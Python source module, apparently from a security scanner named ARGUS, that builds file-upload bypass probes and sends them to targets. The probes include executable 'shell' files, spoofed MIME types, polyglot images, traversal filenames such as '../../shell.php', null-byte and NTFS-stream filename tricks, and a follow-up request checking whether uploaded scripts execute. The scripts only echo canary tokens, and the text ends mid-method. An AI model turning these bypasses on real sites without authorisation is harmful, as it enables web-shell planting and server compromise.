"""
File Upload Vulnerability Detection Module for ARGUS.

Actively discovers, audits, and validates file upload security across API endpoints,
web forms, and live hosts. Detects unrestricted executable uploads, MIME type bypasses,
double extension bypasses, polyglots with magic byte prepending, path traversal in filenames,
and verifies web shell execution via safe canary tokens.

Key Capabilities:
1. Multi-Vector Upload Detection Modes:
   - Unrestricted File Upload: Executable file acceptance (.php, .jsp, .asp, .aspx, .py, .rb, .sh, .exe)
   - MIME Type Bypass: Content-Type header spoofing with dangerous payload content
   - Double Extension Bypass: Multi-language double extension acceptance (.php.jpg, .asp.png, .jsp.gif)
   - Polyglot File Detection: Valid image/document magic bytes (GIF89a, PNG, JPEG SOI, PDF) combined with executable code
   - Path Traversal in Filenames: Arbitrary directory placement via traversal sequences (../, ..\\, encodings)
   - Web Shell Execution Verification: Secondary HTTP reachability and safe canary token execution verification
2. Mutation & Evasion Strategies:
   - Extension Casing Variations (.pHp, .PhP, .PHP, .AsP, .Jsp)
   - Null Byte Injection (.php%00.jpg, .php\x00.jpg, .jsp%00.png)
   - Content-Type Mismatch (executable code sent with benign image/document MIME)
   - Magic Bytes Prepending (GIF, PNG, JPEG, PDF headers)
   - Filename Encoding Variations (URL, double-URL, Unicode dot normalization, overlong UTF-8)
   - Trailing Dots and Spaces (Windows filename normalization bypass)
   - Windows NTFS Alternate Data Streams (::$DATA)
3. Upload Response Analysis:
   - Successful upload indicators (200/201/204 with file URL, storage path disclosure)
   - Storage path disclosure in upload responses (/var/www/, C:\\inetpub\\, cloud buckets)
   - File content reflection and web shell accessibility
   - Error message and stack trace information disclosure
   - Antivirus / WAF timing and error pattern detection
4. Strict False Positive Rejection:
   - Suppresses legitimate image/document uploads with proper server validation.
   - Suppresses 400/403/415/422 rejections with file validation errors.
   - Suppresses filename reflection in error messages without storage.
   - Suppresses randomized UUID renames without execution or public storage.
5. Quadruple State Publishing:
   - Publishes findings to raw_mission.evidence, raw_mission.vulnerabilities,
     attack_surface_graph (HAS_VULNERABILITY and HAS_ENDPOINT edges), and ControlledMission.publish_finding.
"""
from __future__ import annotations

import copy
import json
import logging
import os
import re
import string
import time
import urllib.parse
import uuid
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Set, Tuple, Union

from argus.collectors.base import BaseCollector
from argus.collectors.toolkit.enums import Severity
from argus.evidence.model import Evidence, ProvenanceData
from argus.graph.node import Node
from argus.http.client import AuthenticatedHttpClient, HttpResponse

logger = logging.getLogger(__name__)


# =============================================================================
# Enums & Data Models
# =============================================================================

# Canonical severity scale (see argus.collectors.toolkit.enums.Severity).
FileUploadSeverity = Severity


# Compatibility aliases
FileUploadSeverity.CRIT = FileUploadSeverity.CRITICAL  # type: ignore[attr-defined]


class FileUploadTechnique(str, Enum):
    """Enumeration of File Upload vulnerability techniques and modes."""
    UNRESTRICTED_UPLOAD = "unrestricted_upload"
    MIME_TYPE_BYPASS = "mime_type_bypass"
    DOUBLE_EXTENSION_BYPASS = "double_extension_bypass"
    POLYGLOT_MAGIC_BYTES = "polyglot_magic_bytes"
    PATH_TRAVERSAL_FILENAME = "path_traversal_filename"
    NULL_BYTE_INJECTION = "null_byte_injection"
    WEB_SHELL_EXECUTION = "web_shell_execution"
    INFO_DISCLOSURE = "info_disclosure"
    STORAGE_PATH_DISCLOSURE = "storage_path_disclosure"


# Compatibility aliases
FileUploadTechnique.UNRESTRICTED_FILE_UPLOAD = FileUploadTechnique.UNRESTRICTED_UPLOAD  # type: ignore[attr-defined]
FileUploadTechnique.MIME_BYPASS = FileUploadTechnique.MIME_TYPE_BYPASS  # type: ignore[attr-defined]
FileUploadTechnique.DOUBLE_EXTENSION = FileUploadTechnique.DOUBLE_EXTENSION_BYPASS  # type: ignore[attr-defined]
FileUploadTechnique.POLYGLOT = FileUploadTechnique.POLYGLOT_MAGIC_BYTES  # type: ignore[attr-defined]
FileUploadTechnique.PATH_TRAVERSAL = FileUploadTechnique.PATH_TRAVERSAL_FILENAME  # type: ignore[attr-defined]
FileUploadTechnique.NULL_BYTE = FileUploadTechnique.NULL_BYTE_INJECTION  # type: ignore[attr-defined]
FileUploadTechnique.WEB_SHELL = FileUploadTechnique.WEB_SHELL_EXECUTION  # type: ignore[attr-defined]
FileUploadTechnique.STORAGE_DISCLOSURE = FileUploadTechnique.STORAGE_PATH_DISCLOSURE  # type: ignore[attr-defined]


class FileUploadMutationStrategy(str, Enum):
    """Enumeration of File Upload evasion and mutation strategies."""
    EXTENSION_CASING = "extension_casing"
    NULL_BYTE = "null_byte"
    CONTENT_TYPE_MISMATCH = "content_type_mismatch"
    MAGIC_BYTES_PREPENDING = "magic_bytes_prepending"
    FILENAME_ENCODING = "filename_encoding"
    TRAILING_DOTS_SPACES = "trailing_dots_spaces"
    NTFS_STREAM = "ntfs_stream"
    STANDARD = "standard"


# Compatibility alias
FileUploadStrategy = FileUploadMutationStrategy


class TargetRuntime(str, Enum):
    """Enumeration of backend target application runtime environments."""
    PHP = "php"
    JSP = "jsp"
    ASP_ASPX = "asp_aspx"
    PYTHON = "python"
    RUBY = "ruby"
    BASH = "bash"
    GENERIC = "generic"


@dataclass
class FileUploadProbe:
    """Represents a crafted file upload probe attempt."""
    filename: str
    content: Union[str, bytes]
    content_type: str
    technique: Union[FileUploadTechnique, str]
    strategy: Union[FileUploadMutationStrategy, str] = FileUploadMutationStrategy.STANDARD
    target_runtime: Union[TargetRuntime, str] = TargetRuntime.GENERIC
    canary_token: str = ""
    form_field_name: str = "file"
    extra_fields: Dict[str, Any] = field(default_factory=dict)
    expected_storage_url: Optional[str] = None
    is_benign: bool = False


@dataclass
class FileUploadResponse:
    """Captures the outcome and metadata of a file upload probe execution."""
    status_code: int = 0
    headers: Dict[str, str] = field(default_factory=dict)
    body: str = ""
    elapsed: float = 0.0
    error: Optional[str] = None
    storage_path_disclosed: Optional[str] = None
    storage_url: Optional[str] = None
    is_reflected: bool = False
    web_shell_executed: bool = False
    web_shell_status_code: Optional[int] = None
    web_shell_body: Optional[str] = None
    error_disclosed: Optional[str] = None
    raw_http_response: Optional[HttpResponse] = None


@dataclass
class FileUploadResult:
    """Final evaluated finding for a file upload vulnerability probe."""
    template_id: str
    technique: str
    vulnerability_type: Union[FileUploadTechnique, str]
    mutation_strategy: str
    filename: str
    content_type: str
    severity: str
    cwe_id: str
    cvss_score: float
    description: str
    evidence_snippet: str
    target_url: str
    storage_path: Optional[str] = None
    uploaded_file_url: Optional[str] = None
    canary_token: Optional[str] = None
    target_runtime: str = "generic"
    status_code: int = 200
    confidence: float = 0.95
    is_valid_finding: bool = True


# =============================================================================
# Payload & Probe Generator
# =============================================================================

class FileUploadPayloadGenerator:
    """
    Generates tailored, multi-vector file upload payloads and probe objects
    spanning all supported runtimes, bypass modes, polyglot formats, and evasion mutations.
    """

    # Magic byte signatures for polyglots
    GIF89A_HEADER = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
    PNG_HEADER = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89"
    JPEG_SOI = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00`\x00`\x00\x00\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a\x1f\x1e\x1d\x1a\x1c\x1c $.' \",#\x1c\x1c(7),01444\x1f'9=82<.342\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\xff\xda\x00\x08\x01\x01\x00\x00?\x00\xbf\x00\xff\xd9"
    PDF_HEADER = b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n"

    def __init__(self):
        pass

    def generate_canary(self) -> str:
        """Generates a secure, deterministic tracking canary token."""
        return f"ARGUS_CANARY_{uuid.uuid4().hex[:12]}"

    def build_payload_content(self, runtime: Union[TargetRuntime, str], canary: str) -> str:
        """Generates safe non-destructive script content embedding the canary token."""
        r = str(runtime).lower()
        if TargetRuntime.PHP.value in r or r == "php":
            return f"<?php echo '{canary}'; ?>"
        elif TargetRuntime.JSP.value in r or r == "jsp":
            return f'<% out.println("{canary}"); %>'
        elif TargetRuntime.ASP_ASPX.value in r or "asp" in r:
            return f'<%@ Page Language="C#" %><% Response.Write("{canary}"); %>'
        elif TargetRuntime.PYTHON.value in r or "py" in r:
            return f'import sys\nsys.stdout.write("{canary}")\n'
        elif TargetRuntime.RUBY.value in r or "rb" in r:
            return f'puts "{canary}"\n'
        elif TargetRuntime.BASH.value in r or "sh" in r:
            return f'#!/bin/sh\necho "{canary}"\n'
        else:
            return f"/* ARGUS_PAYLOAD */\n{canary}\n"

    # -------------------------------------------------------------------------
    # R2.1: Unrestricted Executable Upload Probes
    # -------------------------------------------------------------------------
    def generate_unrestricted_probes(self) -> List[FileUploadProbe]:
        """Generates raw executable file upload probes across all supported runtimes."""
        probes: List[FileUploadProbe] = []

        runtime_matrix = [
            (TargetRuntime.PHP, "shell.php", "application/x-php"),
            (TargetRuntime.PHP, "shell.phtml", "application/x-php"),
            (TargetRuntime.PHP, "shell.php5", "application/x-php"),
            (TargetRuntime.JSP, "exploit.jsp", "application/x-jsp"),
            (TargetRuntime.JSP, "exploit.jspx", "application/x-jspx"),
            (TargetRuntime.ASP_ASPX, "payload.aspx", "application/x-aspx"),
            (TargetRuntime.ASP_ASPX, "payload.asp", "application/x-asp"),
            (TargetRuntime.ASP_ASPX, "payload.cer", "application/x-cer"),
            (TargetRuntime.PYTHON, "script.py", "text/x-python"),
            (TargetRuntime.RUBY, "script.rb", "text/x-ruby"),
            (TargetRuntime.BASH, "cmd.sh", "application/x-sh"),
            (TargetRuntime.GENERIC, "binary.exe", "application/x-msdownload"),
        ]

        for rt, fname, ctype in runtime_matrix:
            canary = self.generate_canary()
            content = self.build_payload_content(rt, canary)
            probes.append(
                FileUploadProbe(
                    filename=fname,
                    content=content,
                    content_type=ctype,
                    technique=FileUploadTechnique.UNRESTRICTED_UPLOAD,
                    strategy=FileUploadMutationStrategy.STANDARD,
                    target_runtime=rt,
                    canary_token=canary,
                )
            )

        return probes

    # -------------------------------------------------------------------------
    # R2.2: MIME Type Bypass Probes
    # -------------------------------------------------------------------------
    def generate_mime_bypass_probes(self) -> List[FileUploadProbe]:
        """Generates probes where executable files are paired with spoofed benign MIME types."""
        probes: List[FileUploadProbe] = []

        mime_matrix = [
            (TargetRuntime.PHP, "shell.php", "image/jpeg"),
            (TargetRuntime.PHP, "shell.php", "image/png"),
            (TargetRuntime.PHP, "shell.php", "image/gif"),
            (TargetRuntime.PHP, "shell.phtml", "application/pdf"),
            (TargetRuntime.JSP, "exploit.jsp", "image/png"),
            (TargetRuntime.JSP, "exploit.jsp", "image/jpeg"),
            (TargetRuntime.ASP_ASPX, "payload.aspx", "image/jpeg"),
            (TargetRuntime.ASP_ASPX, "payload.asp", "image/png"),
            (TargetRuntime.PYTHON, "script.py", "image/png"),
            (TargetRuntime.RUBY, "exploit.rb", "application/pdf"),
            (TargetRuntime.BASH, "script.sh", "application/pdf"),
        ]

        for rt, fname, benign_mime in mime_matrix:
            canary = self.generate_canary()
            content = self.build_payload_content(rt, canary)
            probes.append(
                FileUploadProbe(
                    filename=fname,
                    content=content,
                    content_type=benign_mime,
                    technique=FileUploadTechnique.MIME_TYPE_BYPASS,
                    strategy=FileUploadMutationStrategy.CONTENT_TYPE_MISMATCH,
                    target_runtime=rt,
                    canary_token=canary,
                )
            )

        return probes

    # -------------------------------------------------------------------------
    # R2.3: Double Extension Bypass Probes
    # -------------------------------------------------------------------------
    def generate_double_extension_probes(self) -> List[FileUploadProbe]:
        """Generates probes testing double extensions (.php.jpg, .asp.png, .jsp.gif, etc.)."""
        probes: List[FileUploadProbe] = []

        double_ext_matrix = [
            (TargetRuntime.PHP, "shell.php.jpg", "image/jpeg"),
            (TargetRuntime.PHP, "shell.php.png", "image/png"),
            (TargetRuntime.PHP, "shell.php.gif", "image/gif"),
            (TargetRuntime.PHP, "shell.phtml.jpg", "image/jpeg"),
            (TargetRuntime.PHP, "shell.php.pdf", "application/pdf"),
            (TargetRuntime.ASP_ASPX, "payload.asp.png", "image/png"),
            (TargetRuntime.ASP_ASPX, "payload.aspx.jpg", "image/jpeg"),
            (TargetRuntime.ASP_ASPX, "payload.aspx.gif", "image/gif"),
            (TargetRuntime.JSP, "exploit.jsp.gif", "image/gif"),
            (TargetRuntime.JSP, "exploit.jsp.png", "image/png"),
            (TargetRuntime.PYTHON, "script.py.jpg", "image/jpeg"),
            (TargetRuntime.BASH, "script.sh.png", "image/png"),
        ]

        for rt, fname, ctype in double_ext_matrix:
            canary = self.generate_canary()
            content = self.build_payload_content(rt, canary)
            probes.append(
                FileUploadProbe(
                    filename=fname,
                    content=content,
                    content_type=ctype,
                    technique=FileUploadTechnique.DOUBLE_EXTENSION_BYPASS,
                    strategy=FileUploadMutationStrategy.STANDARD,
                    target_runtime=rt,
                    canary_token=canary,
                )
            )

        return probes

    # -------------------------------------------------------------------------
    # R2.4: Polyglot Magic Bytes Probes
    # -------------------------------------------------------------------------
    def generate_polyglot_probes(self) -> List[FileUploadProbe]:
        """Generates valid polyglots combining binary format magic bytes with executable code."""
        probes: List[FileUploadProbe] = []

        polyglot_formats = [
            ("GIF89a", self.GIF89A_HEADER, "image/gif", ".gif", TargetRuntime.PHP),
            ("PNG", self.PNG_HEADER, "image/png", ".png", TargetRuntime.PHP),
            ("JPEG", self.JPEG_SOI, "image/jpeg", ".jpg", TargetRuntime.PHP),
            ("PDF", self.PDF_HEADER, "application/pdf", ".pdf", TargetRuntime.PHP),
            ("GIF89a_JSP", self.GIF89A_HEADER, "image/gif", ".gif", TargetRuntime.JSP),
            ("PNG_JSP", self.PNG_HEADER, "image/png", ".png", TargetRuntime.JSP),
            ("JPEG_ASPX", self.JPEG_SOI, "image/jpeg", ".jpg", TargetRuntime.ASP_ASPX),
            ("GIF89a_ASPX", self.GIF89A_HEADER, "image/gif", ".gif", TargetRuntime.ASP_ASPX),
            ("GIF89a_PY", self.GIF89A_HEADER, "image/gif", ".gif", TargetRuntime.PYTHON),
        ]

        for label, header_bytes, mime, ext, rt in polyglot_formats:
            canary = self.generate_canary()
            script_str = self.build_payload_content(rt, canary)
            polyglot_bytes = header_bytes + b"\n" + script_str.encode("utf-8")
            fname = f"polyglot_{label.lower()}{ext}"

            probes.append(
                FileUploadProbe(
                    filename=fname,
                    content=polyglot_bytes,
                    content_type=mime,
                    technique=FileUploadTechnique.POLYGLOT_MAGIC_BYTES,
                    strategy=FileUploadMutationStrategy.MAGIC_BYTES_PREPENDING,
                    target_runtime=rt,
                    canary_token=canary,
                )
            )

        return probes

    # -------------------------------------------------------------------------
    # R2.5: Path Traversal in Filenames Probes
    # -------------------------------------------------------------------------
    def generate_path_traversal_probes(self) -> List[FileUploadProbe]:
        """Generates probes with filename traversal sequences (../, ..\\, encodings)."""
        probes: List[FileUploadProbe] = []

        traversal_patterns = [
            ("../../shell.php", TargetRuntime.PHP),
            ("..\\..\\shell.php", TargetRuntime.PHP),
            ("....//....//shell.php", TargetRuntime.PHP),
            ("..%2f..%2fshell.php", TargetRuntime.PHP),
            ("..%252f..%252fshell.php", TargetRuntime.PHP),
            ("..%c0%af..%c0%afshell.php", TargetRuntime.PHP),
            (".\\..\\.\\..\\shell.php", TargetRuntime.PHP),
            ("..\\..\\..\\..\\var\\www\\html\\shell.php", TargetRuntime.PHP),
            ("..\\..\\..\\..\\inetpub\\wwwroot\\shell.aspx", TargetRuntime.ASP_ASPX),
            ("../../exploit.jsp", TargetRuntime.JSP),
        ]

        for fname, rt in traversal_patterns:
            canary = self.generate_canary()
            content = self.build_payload_content(rt, canary)
            probes.append(
                FileUploadProbe(
                    filename=fname,
                    content=content,
                    content_type="application/octet-stream",
                    technique=FileUploadTechnique.PATH_TRAVERSAL_FILENAME,
                    strategy=FileUploadMutationStrategy.FILENAME_ENCODING,
                    target_runtime=rt,
                    canary_token=canary,
                )
            )

        return probes

    # -------------------------------------------------------------------------
    # R4: Evasion Mutation Strategies Matrix
    # -------------------------------------------------------------------------
    def generate_evasion_mutations(self) -> List[FileUploadProbe]:
        """Generates probes covering the 7 distinct evasion & mutation strategies."""
        probes: List[FileUploadProbe] = []

        # Strategy 1: Extension Casing
        casing_variants = [
            ("shell.pHp", TargetRuntime.PHP),
            ("shell.PhP", TargetRuntime.PHP),
            ("shell.PHP", TargetRuntime.PHP),
            ("payload.AsP", TargetRuntime.ASP_ASPX),
            ("payload.AsPx", TargetRuntime.ASP_ASPX),
            ("payload.ASPX", TargetRuntime.ASP_ASPX),
            ("exploit.Jsp", TargetRuntime.JSP),
            ("exploit.JSP", TargetRuntime.JSP),
            ("script.Py", TargetRuntime.PYTHON),
            ("cmd.SH", TargetRuntime.BASH),
        ]
        for fname, rt in casing_variants:
            canary = self.generate_canary()
            content = self.build_payload_content(rt, canary)
            probes.append(
                FileUploadProbe(
                    filename=fname,
                    content=content,
                    content_type="application/octet-stream",
                    technique=FileUploadTechnique.UNRESTRICTED_UPLOAD,
                    strategy=FileUploadMutationStrategy.EXTENSION_CASING,
                    target_runtime=rt,
                    canary_token=canary,
                )
            )

        # Strategy 2: Null Byte Injection
        null_byte_variants = [
            ("shell.php%00.jpg", TargetRuntime.PHP, "image/jpeg"),
            ("shell.php\x00.png", TargetRuntime.PHP, "image/png"),
            ("exploit.jsp%00.gif", TargetRuntime.JSP, "image/gif"),
            ("exploit.jsp\x00.jpg", TargetRuntime.JSP, "image/jpeg"),
            ("payload.asp%00.png", TargetRuntime.ASP_ASPX, "image/png"),
            ("payload.aspx\x00.jpg", TargetRuntime.ASP_ASPX, "image/jpeg"),
        ]
        for fname, rt, ctype in null_byte_variants:
            canary = self.generate_canary()
            content = self.build_payload_content(rt, canary)
            probes.append(
                FileUploadProbe(
                    filename=fname,
                    content=content,
                    content_type=ctype,
                    technique=FileUploadTechnique.NULL_BYTE_INJECTION,
                    strategy=FileUploadMutationStrategy.NULL_BYTE,
                    target_runtime=rt,
                    canary_token=canary,
                )
            )

        # Strategy 3: Filename Encoding Variations
        encoding_variants = [
            ("shell%2ephp", TargetRuntime.PHP),
            ("shell%252ephp", TargetRuntime.PHP),
            ("shell\uff0ephp", TargetRuntime.PHP),  # Unicode fullwidth dot
            ("shell\u3002php", TargetRuntime.PHP),  # Ideographic full stop
            ("shell%c0%aephp", TargetRuntime.PHP),  # Overlong UTF-8
        ]
        for fname, rt in encoding_variants:
            canary = self.generate_canary()
            content = self.build_payload_content(rt, canary)
            probes.append(
                FileUploadProbe(
                    filename=fname,
                    content=content,
                    content_type="application/octet-stream",
                    technique=FileUploadTechnique.UNRESTRICTED_UPLOAD,
                    strategy=FileUploadMutationStrategy.FILENAME_ENCODING,
                    target_runtime=rt,
                    canary_token=canary,
                )
            )

        # Strategy 4: Trailing Dots & Spaces (Windows Normalization)
        trailing_variants = [
            ("shell.php.", TargetRuntime.PHP),
            ("shell.php...", TargetRuntime.PHP),
            ("shell.php ", TargetRuntime.PHP),
            ("shell.php. .", TargetRuntime.PHP),
            ("payload.aspx.", TargetRuntime.ASP_ASPX),
            ("payload.aspx ", TargetRuntime.ASP_ASPX),
        ]
        for fname, rt in trailing_variants:
            canary = self.generate_canary()
            content = self.build_payload_content(rt, canary)
            probes.append(
                FileUploadProbe(
                    filename=fname,
                    content=content,
                    content_type="application/octet-stream",
                    technique=FileUploadTechnique.UNRESTRICTED_UPLOAD,
                    strategy=FileUploadMutationStrategy.TRAILING_DOTS_SPACES,
                    target_runtime=rt,
                    canary_token=canary,
                )
            )

        # Strategy 5: NTFS Alternate Data Streams (::$DATA)
        ntfs_variants = [
            ("shell.php::$DATA", TargetRuntime.PHP),
            ("shell.php::$INDEX_ALLOCATION", TargetRuntime.PHP),
            ("payload.aspx::$DATA", TargetRuntime.ASP_ASPX),
        ]
        for fname, rt in ntfs_variants:
            canary = self.generate_canary()
            content = self.build_payload_content(rt, canary)
            probes.append(
                FileUploadProbe(
                    filename=fname,
                    content=content,
                    content_type="application/octet-stream",
                    technique=FileUploadTechnique.UNRESTRICTED_UPLOAD,
                    strategy=FileUploadMutationStrategy.NTFS_STREAM,
                    target_runtime=rt,
                    canary_token=canary,
                )
            )

        return probes

    # -------------------------------------------------------------------------
    # Benign Baseline Generation
    # -------------------------------------------------------------------------
    def generate_benign_probes(self) -> List[FileUploadProbe]:
        """Generates authentic, benign image/document probes for false positive baselining."""
        probes: List[FileUploadProbe] = [
            FileUploadProbe(
                filename="legitimate_image.jpg",
                content=self.JPEG_SOI,
                content_type="image/jpeg",
                technique=FileUploadTechnique.UNRESTRICTED_UPLOAD,
                strategy=FileUploadMutationStrategy.STANDARD,
                target_runtime=TargetRuntime.GENERIC,
                canary_token="",
                is_benign=True,
            ),
            FileUploadProbe(
                filename="legitimate_photo.png",
                content=self.PNG_HEADER,
                content_type="image/png",
                technique=FileUploadTechnique.UNRESTRICTED_UPLOAD,
                strategy=FileUploadMutationStrategy.STANDARD,
                target_runtime=TargetRuntime.GENERIC,
                canary_token="",
                is_benign=True,
            ),
            FileUploadProbe(
                filename="document.pdf",
                content=self.PDF_HEADER + b"Sample PDF document text\n%%EOF",
                content_type="application/pdf",
                technique=FileUploadTechnique.UNRESTRICTED_UPLOAD,
                strategy=FileUploadMutationStrategy.STANDARD,
                target_runtime=TargetRuntime.GENERIC,
                canary_token="",
                is_benign=True,
            ),
        ]
        return probes

    def apply_mutation(
        self,
        probe: FileUploadProbe,
        strategy: Union[FileUploadMutationStrategy, str],
    ) -> FileUploadProbe:
        """Applies a specified evasion/mutation strategy to a given FileUploadProbe."""
        strat = FileUploadMutationStrategy(strategy) if isinstance(strategy, str) else strategy
        mutated = copy.deepcopy(probe)
        mutated.strategy = strat
        base_name, ext = os.path.splitext(probe.filename)

        if strat == FileUploadMutationStrategy.EXTENSION_CASING:
            # Alternating extension casing: .php -> .pHp
            if ext:
                cased_ext = "".join(c.upper() if i % 2 == 1 else c.lower() for i, c in enumerate(ext))
                mutated.filename = f"{base_name}{cased_ext}"

        elif strat == FileUploadMutationStrategy.NULL_BYTE:
            # Append %00.jpg null byte sequence
            mutated.filename = f"{probe.filename}%00.jpg"
            mutated.content_type = "image/jpeg"

        elif strat == FileUploadMutationStrategy.CONTENT_TYPE_MISMATCH:
            mutated.content_type = "image/jpeg"

        elif strat == FileUploadMutationStrategy.MAGIC_BYTES_PREPENDING:
            canary = probe.canary_token or self.generate_canary()
            if isinstance(probe.content, bytes):
                content_bytes = probe.content
            elif isinstance(probe.content, str) and probe.content:
                content_bytes = probe.content.encode("utf-8")
            else:
                script_content = self.build_payload_content(probe.target_runtime, canary)
                content_bytes = script_content.encode("utf-8")
            mutated.content = self.GIF89A_HEADER + b"\n" + content_bytes
            mutated.content_type = "image/gif"

        elif strat == FileUploadMutationStrategy.FILENAME_ENCODING:
            # URL encode dots or slashes
            mutated.filename = probe.filename.replace(".", "%2e")

        elif strat == FileUploadMutationStrategy.TRAILING_DOTS_SPACES:
            mutated.filename = f"{probe.filename}."

        elif strat == FileUploadMutationStrategy.NTFS_STREAM:
            mutated.filename = f"{probe.filename}::$DATA"

        return mutated

    def generate_all_probes(self) -> List[FileUploadProbe]:
        """Returns the full aggregated suite of file upload probes."""
        all_probes: List[FileUploadProbe] = []
        all_probes.extend(self.generate_unrestricted_probes())
        all_probes.extend(self.generate_mime_bypass_probes())
        all_probes.extend(self.generate_double_extension_probes())
        all_probes.extend(self.generate_polyglot_probes())
        all_probes.extend(self.generate_path_traversal_probes())
        all_probes.extend(self.generate_evasion_mutations())
        return all_probes


# =============================================================================
# Probing Engine
# =============================================================================

class FileUploadProber:
    """
    Executes multipart/form-data HTTP upload requests and secondary web shell
    verification requests using AuthenticatedHttpClient.
    """

    def __init__(self, client: Optional[Any] = None, timeout: float = 10.0):
        self.client = client or AuthenticatedHttpClient(timeout=timeout)
        self.timeout = timeout

    def execute_upload(
        self,
        mission: Any,
        target_url: str,
        probe: FileUploadProbe,
        field_name: Optional[str] = None,
    ) -> FileUploadResponse:
        """
        Dispatches a multipart/form-data upload request containing the probe payload.
        """
        actual_field = field_name or probe.form_field_name or "file"
        content_bytes = probe.content.encode("utf-8") if isinstance(probe.content, str) else probe.content

        # Build files tuple for multipart request: (filename, file_content, content_type)
        files = {
            actual_field: (probe.filename, content_bytes, probe.content_type)
        }

        data = dict(probe.extra_fields) if probe.extra_fields else None

        start_time = time.time()
        try:
            if hasattr(self.client, "post"):
                import inspect
                sig = inspect.signature(self.client.post)
                if "mission" in sig.parameters:
                    raw_resp = self.client.post(
                        mission=mission,
                        url=target_url,
                        files=files,
                        data=data,
                        timeout=self.timeout,
                        action="file_upload_probe",
                    )
                else:
                    raw_resp = self.client.post(
                        target_url,
                        files=files,
                        data=data,
                        timeout=self.timeout,
                    )
            elif hasattr(self.client, "request"):
                raw_resp = self.client.request(
                    "POST",
                    target_url,
                    files=files,
                    data=data,
                    timeout=self.timeout,
                )
            else:
                raw_resp = None

            elapsed = time.time() - start_time

            if raw_resp is None:
                return FileUploadResponse(
                    status_code=0,
                    elapsed=elapsed,
                    error="Client returned None or unsupported method",
                )

            body_str = getattr(raw_resp, "body", "") or getattr(raw_resp, "raw_body", "") or ""
            headers_dict = dict(getattr(raw_resp, "headers", {}) or {})

            response = FileUploadResponse(
                status_code=getattr(raw_resp, "status_code", 0) or 0,
                headers=headers_dict,
                body=body_str,
                elapsed=elapsed,
                error=getattr(raw_resp, "error", None),
                raw_http_response=raw_resp,
            )

            # If upload succeeded (200/201/204), check for storage path / URL and verify web shell
            if response.status_code in (200, 201, 202, 204):
                self._extract_storage_information(response, target_url, probe.filename)
                if response.storage_url and probe.canary_token:
                    self._check_web_shell_reachability(mission, response, probe.canary_token)

            return response

        except Exception as e:
            elapsed = time.time() - start_time
            logger.warning(f"FileUploadProber: Error probing {target_url}: {e}")
            return FileUploadResponse(
                status_code=0,
                elapsed=elapsed,
                error=str(e),
            )

    def _extract_storage_information(
        self,
        response: FileUploadResponse,
        target_url: str,
        filename: str,
    ) -> None:
        """Extracts file location / storage URL / server path from response body & headers."""
        body = response.body
        headers = response.headers

        # 1. Location header
        loc = headers.get("location") or headers.get("Location")
        if loc:
            response.storage_url = urllib.parse.urljoin(target_url, loc)

        # 2. JSON response parsing
        try:
            data = json.loads(body)
            if isinstance(data, dict):
                # Prioritize explicit URL keys first
                for key in ("file_url", "download_url", "url", "location", "link", "src"):
                    if key in data and isinstance(data[key], str) and data[key].strip():
                        val = data[key].strip()
                        if val.startswith("http://") or val.startswith("https://"):
                            response.storage_url = val
                        elif not val.startswith(("/var/", "/tmp/", "/home/", "/app/", "/opt/", "/srv/", "/usr/", "/etc/", "C:\\", "D:\\")):
                            response.storage_url = urllib.parse.urljoin(target_url, val)
                        break

                # Check filesystem path keys and record disclosed server paths
                for path_key in ("path", "filepath", "file_path", "storage_path", "server_path", "destination", "saved_to", "absolute_path"):
                    if path_key in data and isinstance(data[path_key], str) and data[path_key].strip():
                        path_val = data[path_key].strip()
                        if (
                            path_val.startswith(("/", "\\", "C:", "D:", "E:"))
                            or re.search(r'(/var/|/tmp/|/home/|/app/|/srv/|/opt/|/usr/|/etc/|[A-Za-z]:\\)', path_val)
                        ):
                            response.storage_path_disclosed = path_val
                        elif not response.storage_url:
                            # Relative path acting as storage URL fallback
                            response.storage_url = urllib.parse.urljoin(target_url, path_val)
        except Exception:
            pass

        # Also check regex for filesystem path disclosure in response body if not found in JSON
        if not response.storage_path_disclosed and body:
            fp_match = re.search(r'((?:/[a-zA-Z0-9_\-\.]+)+/(?:uploads?|tmp|var|www|public|storage|media)/[a-zA-Z0-9_\-\.]+)', body)
            if fp_match:
                response.storage_path_disclosed = fp_match.group(1)

        # 3. HTML / Regex extraction for URL containing filename or upload paths
        if not response.storage_url and body:
            clean_fn = os.path.basename(filename).split("%00")[0].split("\x00")[0]
            if clean_fn:
                # Look for href/src with upload paths
                pattern = rf'(?:href|src|url)=["\']([^"\']*{re.escape(clean_fn)}[^"\']*)["\']'
                m = re.search(pattern, body, re.IGNORECASE)
                if m:
                    response.storage_url = urllib.parse.urljoin(target_url, m.group(1))

        # 4. Default predictable upload paths if not explicitly given
        if not response.storage_url and response.status_code in (200, 201):
            clean_fn = os.path.basename(filename).split("%00")[0].split("\x00")[0]
            if clean_fn and ("upload" in body.lower() or "success" in body.lower() or "created" in body.lower()):
                # Test predictable relative path e.g. /uploads/shell.php
                parsed = urllib.parse.urlparse(target_url)
                base = f"{parsed.scheme}://{parsed.netloc}"
                response.storage_url = f"{base}/uploads/{clean_fn}"

    def _check_web_shell_reachability(
        self,
        mission: Any,
        response: FileUploadResponse,
        canary_token: str,
    ) -> None:
        """Attempts a secondary GET request to verify whether uploaded file is accessible/executable."""
        if not response.storage_url:
            return

        try:
            if hasattr(self.client, "get"):
                import inspect
                sig = inspect.signature(self.client.get)
                if "mission" in sig.parameters:
                    get_resp = self.client.get(
                        mission=mission,
                        url=response.storage_url,
                        timeout=self.timeout,
                        action="file_upload_shell_verify",
                    )
                else:
                    get_resp = self.client.get(
                        response.storage_url,
                        timeout=self.timeout,
                    )
            elif hasattr(self.client, "request"):
